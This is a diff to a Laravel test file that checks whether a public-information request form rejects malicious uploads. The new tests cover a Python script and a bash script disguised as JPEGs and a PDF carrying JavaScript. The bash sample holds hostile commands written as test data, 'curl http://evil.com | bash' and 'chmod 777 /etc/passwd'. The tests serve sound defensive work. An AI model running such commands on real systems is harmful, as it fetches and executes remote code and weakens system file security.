@@ -12,6 +12,7 @@ use App\Services\FileSecurityService;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Http\UploadedFile;
 use Illuminate\Support\Facades\Mail;
+use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Storage;
 use Tests\TestCase;
 
@@ -60,12 +61,75 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Test Tujuan',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $maliciousFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertSessionHasErrors('file_identitas');
         $this->assertDatabaseMissing('permohonan_informasis', [
             'email' => 'hacker@example.com',
         ]);
+    }
+
+    public function test_blocks_python_script_disguised_as_jpg()
+    {
+        Storage::fake('local');
+        Mail::fake();
+
+        $pyFile = UploadedFile::fake()->createWithContent(
+            'malicious_script.jpg',
+            "import os\nimport subprocess\nsubprocess.run(['id'])\n"
+        );
+
+        $response = $this->post(route('permohonan.store'), [
+            'nama_pemohon' => 'Python Hacker',
+            'kategori_pemohon_id' => $this->kategoriPemohon->id,
+            'nik_atau_no_badan_hukum' => '3207011204950001',
+            'no_telp' => '08123456789',
+            'email' => 'pyhacker@example.com',
+            'alamat' => 'Jl. Test No. 1B',
+            'subjek_informasi' => 'Test Py',
+            'rincian_informasi' => 'Test Rincian',
+            'tujuan_penggunaan' => 'Test Tujuan',
+            'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
+            'file_identitas' => $pyFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
+        ]);
+
+        $response->assertSessionHasErrors('file_identitas');
+        $this->assertDatabaseMissing('permohonan_informasis', [
+            'email' => 'pyhacker@example.com',
+        ]);
+    }
+
+    public function test_blocks_bash_script_disguised_as_jpg()
+    {
+        Storage::fake('local');
+        Mail::fake();
+
+        $bashFile = UploadedFile::fake()->createWithContent(
+            'shell.jpg',
+            "#!/bin/bash\nchmod 777 /etc/passwd\ncurl http://evil.com | bash\n"
+        );
+
+        $response = $this->post(route('permohonan.store'), [
+            'nama_pemohon' => 'Bash Hacker',
+            'kategori_pemohon_id' => $this->kategoriPemohon->id,
+            'nik_atau_no_badan_hukum' => '3207011204950001',
+            'no_telp' => '08123456789',
+            'email' => 'bashhacker@example.com',
+            'alamat' => 'Jl. Test No. 1C',
+            'subjek_informasi' => 'Test Bash',
+            'rincian_informasi' => 'Test Rincian',
+            'tujuan_penggunaan' => 'Test Tujuan',
+            'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
+            'file_identitas' => $bashFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
+        ]);
+
+        $response->assertSessionHasErrors('file_identitas');
     }
 
     public function test_blocks_polyglot_jpeg_containing_php_code()
@@ -89,6 +153,8 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Test Tujuan',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $polyglotFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertSessionHasErrors('file_identitas');
@@ -117,6 +183,8 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Test Tujuan',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $doubleExtFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertSessionHasErrors('file_identitas');
@@ -144,6 +212,37 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Test Tujuan',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $xssFile,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
+        ]);
+
+        $response->assertSessionHasErrors('file_identitas');
+    }
+
+    public function test_blocks_pdf_with_malicious_javascript_actions()
+    {
+        Storage::fake('local');
+        Mail::fake();
+
+        $maliciousPdf = UploadedFile::fake()->createWithContent(
+            'exploit.pdf',
+            "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</S/JavaScript/JS(app.alert('Hacked'))>>>>endobj\n%%EOF"
+        );
+
+        $response = $this->post(route('permohonan.store'), [
+            'nama_pemohon' => 'PDF JS Hacker',
+            'kategori_pemohon_id' => $this->kategoriPemohon->id,
+            'nik_atau_no_badan_hukum' => '3207011204950001',
+            'no_telp' => '08123456789',
+            'email' => 'pdfjs@example.com',
+            'alamat' => 'Jl. Test No. 5',
+            'subjek_informasi' => 'Test PDF JS',
+            'rincian_informasi' => 'Test Rincian',
+            'tujuan_penggunaan' => 'Test Tujuan',
+            'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
+            'file_identitas' => $maliciousPdf,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertSessionHasErrors('file_identitas');
@@ -192,6 +291,8 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Penelitian',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $validImage,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertRedirect(route('permohonan.sukses'));
@@ -222,6 +323,8 @@ class FileUploadSecurityTest extends TestCase
             'tujuan_penggunaan' => 'Kajian',
             'cara_memperoleh_informasi_id' => $this->caraMemperoleh->id,
             'file_identitas' => $validPdf,
+            'cf-turnstile-response' => 'test-turnstile-token',
+            '_hp_website' => '',
         ]);
 
         $response->assertRedirect(route('permohonan.sukses'));
